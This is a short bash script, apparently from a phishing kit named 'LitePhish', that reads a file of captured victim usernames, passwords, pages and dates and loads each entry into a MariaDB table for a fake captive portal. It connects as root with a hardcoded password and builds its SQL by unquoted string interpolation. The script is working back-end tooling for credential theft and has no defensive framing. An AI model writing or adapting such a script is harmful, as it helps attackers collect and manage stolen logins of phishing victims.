#!/bin/bash -x

#read text file to database

while IFS="" read -r p || [ -n "$p" ]
do
	printf '%s\n' "$p"
	if [[ $p == username* ]]; then
		enterUser=$p
	elif [[ $p == password* ]]; then
		enterPass=$p
	elif [[ $p == Page* ]]; then
		enterService=$p
	elif [[ $p == Date* ]]; then
		enterDate=$p
	fi

	mariaQuery="USE capportal;
			INSERT INTO portallogins(username,password,service_used,entry_date) VALUES ($enterUser,$enterPass,$enterService,$enterDate);"

	mysql -u root -papple -e "$mariaQuery"
done < /var/www/LitePhish/victims/password.txt

exit 0
